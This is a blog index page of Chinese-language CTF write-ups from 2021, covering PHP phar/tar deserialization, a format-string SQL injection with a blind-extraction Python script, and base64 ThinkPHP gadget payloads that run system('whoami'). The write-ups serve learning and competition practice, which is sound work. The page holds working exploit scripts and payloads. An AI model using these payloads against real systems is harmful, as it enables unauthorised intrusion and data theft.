<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">180</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/29/2021i%E6%98%A5%E7%A7%8B%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/">2021i春秋秋季个人赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-29</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>和安洵杯冲了，在安洵杯没思路的时候去做了一下，就做了一下第一题</p>
<h2 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h2><p>源码很简单，分为exists和upload两部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $_POST[<span class="string">&quot;func&quot;</span>]();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$ip=$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">$find_this = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`cat /flag`);&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!$_GET[<span class="string">&#x27;ip&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($filename == <span class="literal">NULL</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (file_exists($filename))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;该文件存在&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;该文件不存在&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显是phar反序列化，file_exists触发，然后upload过滤了一系列内容，但是可以使用tar文件进行反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $_POST[<span class="string">&quot;func&quot;</span>]();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj=<span class="keyword">new</span> name1();</span><br><span class="line">$b=<span class="keyword">new</span> name2();</span><br><span class="line">$obj-&gt;var=$b;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;test.tar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> PharData(<span class="string">&quot;get_flag.tar&quot;</span>);</span><br><span class="line">$phar[<span class="string">&quot;AAABshpik&quot;</span>] = <span class="string">&quot;FLAGFLAGFLAG&quot;</span>;</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br></pre></td></tr></table></figure>

<p>然后改后缀为jpg就行了，但其实有个问题，这里不是对tar文件进行操作判断是否有那个字符了吗？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(<span class="string">&quot;tar -tf &quot;</span>.$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$r_array);</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="string">&quot;.phar/.metadata&quot;</span>,$r_array))&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>让我们测试一下<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211129110220.png" alt="img"></p>
<p>-t或–list 列出备份文件的内容，而这个tar的文件内容有两部分，他只检测了第一部分–，所以就轻而易举的绕过了<br>然后后面在本地看一下文件名是什么，利用exists页面的$ip=$_SERVER[‘REMOTE_ADDR’];这个输出内容加上那个字符串经过md5解码一下就可以，然后完整目录是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload&#x2F;xxxxx.gif</span><br></pre></td></tr></table></figure>

<p>然后在exists页面使用phar协议进行访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;xxx.gif</span><br></pre></td></tr></table></figure>

<p>但是同时要传参，这里需要去执行那个create_function</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$find_this &#x3D; create_function(&quot;&quot;, &#39;die(&#96;cat &#x2F;flag&#96;);&#39;);</span><br></pre></td></tr></table></figure>

<p>网上有文章</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码很简洁粗暴，开头就创建了一个全局函数，可以查看flag。</span><br><span class="line"></span><br><span class="line">create_function生成的函数名有些特殊，它是NULL字符加上”lambda_”再加个一个数字标识（\x00lambda_数字标识），其中数字标识代表它是当前进程中的第几个匿名函数。create_function的实现步骤如下：</span><br><span class="line"></span><br><span class="line">获取参数, 函数体</span><br><span class="line">拼凑一个”function __lambda_func (参数) &#123; 函数体;&#125; “的字符串</span><br><span class="line">eval之</span><br><span class="line">通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错</span><br><span class="line">定义一个函数名:”\000_lambda_” . count(anonymous_functions)++</span><br><span class="line">用新的函数名替换__lambda_func</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.shawroot.cc/631.html">https://www.shawroot.cc/631.html</a></p>
<p>直接别人脚本跑就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">i &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81&#x2F;?func_name&#x3D;%00lambda_1&#39;)</span><br><span class="line">    if &#39;flag&#39; in r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">    i +&#x3D; 1</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<p>但是需要注意的是，这里是post请求，所以要改改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">i &#x3D; 0</span><br><span class="line">data&#x3D;&#123;&quot;func&quot;:&quot;%00(这个%00进行url解码以后再发送过去)lambda_1&quot;&#125;</span><br><span class="line">while True:</span><br><span class="line">    r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81&#x2F;?filename&#x3D;phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;xxxx.gif&#39;,)</span><br><span class="line">    if &#39;flag&#39; in r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">    i +&#x3D; 1</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<p>然后就可以拿到flag了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/29/2021NCTF/">2021NCTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-29</time><div class="content"><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>格式化字符串漏洞,之前hack.lu做过payload是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;1%1$&#39;) or 1&#x3D;1#&amp;name&#x3D;a</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125;</span><br></pre></td></tr></table></figure>

<p>然后接下来就是常规的盲注了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;1%1$&#39;) or substr(database(),1,1)&gt;0#&amp;name&#x3D;a</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;f&quot;1%1$&#39;) or substr((&#123;change_pa&#125;),&#123;i&#125;,1)&gt;&#123;mid&#125;#&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表名：</span><br><span class="line">NcTF,users</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://129.211.173.64:3080/login.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_in</span>(<span class="params">change_pa</span>):</span></span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        low=<span class="number">0</span></span><br><span class="line">        high=<span class="number">264</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">            payload=<span class="string">f&quot;1%1$&#x27;) or ascii(substr((<span class="subst">&#123;change_pa&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">            data=&#123;<span class="string">&quot;password&quot;</span>:payload,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;NCTF&#123;3v3ryth1&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high=mid</span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">264</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database += chr(mid)</span><br><span class="line">        print(database)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#data=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment">#data=&quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot;</span></span><br><span class="line">    <span class="comment">#data = &#x27;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x4e635446&#x27;</span></span><br><span class="line">    data=<span class="string">&#x27;select/**/`fl@g`/**/from/**/NcTF limit 1,1&#x27;</span></span><br><span class="line">    <span class="comment">#data=&quot;version()&quot;</span></span><br><span class="line">    sql_in(data)</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/27/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/">2021安洵杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-27</time><div class="content"><p>扫描</p>
<p>发现是是fastjson-1.2.47， JDK 1.3.1 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>easytp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAE6ChYQQAAAAMfn&#x2F;YtgEAAAAAAAB0ZXN0R8Un+dr04897mUVob2bLZdKmlRkCAAAAR0JNQg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8</span><br><span class="line">DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAbLKhYQQAAAAMfn&#x2F;YtgEAAAAAAAB0ZXN0X3PmDDRS4FHBGm6qipcoKSJ8JRECAAAAR0JNQg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAx6 hYQQAAAAMfn&#x2F;YtgEAAAAAAAB0ZXN0FLfX2uY rTDjIvKfzYKxEr1rbNoCAAAAR0JNQg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoZAQAAAQAAABEAAAABAAAAAADkAAAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MToiYSI7czo2OiJzeXN0ZW0iO31zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjE6ImEiO3M6Njoid2hvYW1pIjt9fX19BwAAAGV4cC50eHQEAAAAbLKhYQQAAAAMfn&#x2F;YtgEAAAAAAAB0ZXN0X3PmDDRS4FHBGm6qipcoKSJ8JRECAAAAR0JNQg&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/25/docker%E5%9F%BA%E6%93%8D/">docker基操</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-25</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近都在用docker来复现题目，但是每次都忘记指令，所以来整理一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t docker名字 -f docker路径 .</span><br><span class="line">例: docker build -t eaysphp -f .&#x2F;Dockerfile .</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211125152159.png" alt="img"></p>
<p><code>运行docker</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 要映射的端口号（针对服务器而言）:docker里面的web服务端口 容器名字</span><br><span class="line">docker run -itd -p 8080:80 easyphp</span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211125152636.png" alt="img" style="zoom:67%;">

<p>进入docker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps 先看一下要进入的dockerid</span><br><span class="line">docker exec -it docker的id bash</span><br><span class="line">docker exec -it 5axxxx bash</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211125153005.png" alt="img" style="zoom:67%;">

<p>一些报错</p>
 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211125153211.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systmctl daemon-reload</span><br><span class="line">service docker restart</span><br><span class="line">service docker status</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/23/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phar反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-23</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写过的关于phar的考点，但是忘记放在哪个博客了，以后命名还是不能以比赛题目命名呀。。。所以重新整理一下</p>
<h2 id="phar触发函数"><a href="#phar触发函数" class="headerlink" title="phar触发函数"></a>phar触发函数</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211123102128.png" alt="在这里插入图片描述" style="zoom:67%;">

<ul>
<li><code>exif</code></li>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
<li><code>gd</code></li>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
<li><code>hash</code></li>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
<li><code>file / url</code></li>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>standard</code></li>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstringfinfo_file/finfo_buffer/mime_content_type</code></li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/22/2021nu1lctf/">2021nu1lctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-22</time><div class="content"><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is /flag</span></span><br><span class="line">$path=$_POST[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">$time=(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;time&#x27;</span>])) ? urldecode(date(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>))) : date(<span class="string">&quot;Y/m/d H:i:s&quot;</span>);</span><br><span class="line">$name=<span class="string">&quot;D:\apache\www\nu1l\\&quot;</span>.time().rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">$black=<span class="string">&quot;f|ht|ba|z|ro|;|,|=|g|da|_&quot;</span>;</span><br><span class="line">$blist=explode(<span class="string">&quot;|&quot;</span>,$black);</span><br><span class="line"><span class="keyword">foreach</span>($blist <span class="keyword">as</span> $b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos($path,$b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents($name, $time))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre class=&#x27;language-html&#x27;&gt;&lt;code class=&#x27;language-html&#x27;&gt;logpath:<span class="subst">$name</span>&lt;/code&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$check=preg_replace(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,file_get_contents($path));</span><br><span class="line"><span class="keyword">if</span>(is_file($check))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre class=&#x27;language-html&#x27;&gt;&lt;code class=&#x27;language-html&#x27;&gt;&quot;</span>.file_get_contents($check).<span class="string">&quot;&lt;/code&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>考点主要在于绕过date的混淆，查阅了一下文档，发现加了反斜杠以后不会被date函数给处理，所以可以直接输入<code>///f/a/l/g</code>存入log中即为/flag，后面又会log文件里面读出值，然后从file_get_content中读取/flag的值，即可拿到flag</p>
<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>考点</code></p>
<p>phar反序列化，但是重点在于如何绕过脏字符</p>
<p>首先我们需要触发的入口在哪里，只有这里包含了flag.php，并且存在file_exists而且file是可控的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">include_once &quot;log.php&quot;;</span><br><span class="line"></span><br><span class="line">if(file_exists(@$_GET[&quot;file&quot;]))&#123;</span><br><span class="line">    echo &quot;file exist!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;file not exist!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这也就是意味着，我们在log.php那边写入文件，在index.php那里读</p>
<p>首先我们需要理清楚触发phar的条件是否都可以具备？，最大的问题在于这里，phar文件要求，他是需要后四位必须为GBMB作为签名来识别的，但是可以发现，我们写入的内容后四位会被没法是GBMB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$log &#x3D; &#39;Time: &#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39; IP: [&#39; . @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] . &#39;], REQUEST: [&#39; . $gets . &#39;], CONTENT: [&#39; . file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;) . &quot;]\n&quot;;</span><br><span class="line">$log_file &#x3D; $log_ip_dir . &#39;&#x2F;&#39; . $log_type . &#39;_www.log&#39;;</span><br><span class="line"></span><br><span class="line">file_put_contents($log_file, $log, FILE_APPEND);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以这里就需要换一种思路来解决了，phar://可以反序列化的文件有zip, tar, phar，zip的文件更加严格了，似乎不是直接创建就可以的–，大概原因是他是压缩文件格式吧，我们分别测试一下看看哪一种不会因为脏字符文件尾而导致反序列化失败，分别对phar和tar输出他们文件内容:</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124225947.png" alt="img" style="zoom:67%;">

<p>可以发现phar文件的文件尾是GBMB，接下来我们针对测试一下修改文件后缀、文件尾、文件头试试<br><code>1.文件头</code><br>格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。并且在php当中生成phar文件的时候，这部分内容无法更改，更改以后将无法正确生成phar文件，但其实在本题当中没多大影响，因为生成phar文件的时候，这个头是连接序列化内容一起写入的，不会被打断，并且&lt;?php前面有什么内容都没有影响</p>
<p><code>2.文件尾</code><br>文件尾需要GBMB结尾，可以发现，如果被截断的话，将无法正确读取<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124230839.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124230850.png" alt="img" style="zoom:67%;"></p>
<p>那么接下来的思路就是构建tar文件，进行phar反序列化了</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>环境搭建过程:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -t easyphp -f .&#x2F;Dockerfile .</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">sudo service docker restart</span><br><span class="line">sudo service docker status </span><br></pre></td></tr></table></figure>

<p>首先理一下思路，我们在本地构造了一个tar包，需要做的是将它读取出来写入log文件里面，那么如何将其规范的写入应该是我们面对的问题，这里直接参考大师傅std的脚本了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">CLASS</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;FLAG: &quot;</span> . <span class="keyword">$this</span>-&gt;_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;get_flag.tar&quot;</span>);</span><br><span class="line">$phar=<span class="keyword">new</span> PharData(<span class="string">&quot;get_flag.tar&quot;</span>);</span><br><span class="line">$phar[<span class="string">&quot;ABCDstypr&quot;</span>] = <span class="string">&quot;GETFLAGGETFLAG&quot;</span>;</span><br><span class="line">$obj = <span class="keyword">new</span> FLAG();</span><br><span class="line"><span class="keyword">print</span>($phar);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br></pre></td></tr></table></figure>

<p>接下来将其转化一下发送过去，写一个脚本来实现，这里主要以学习为主了–</p>
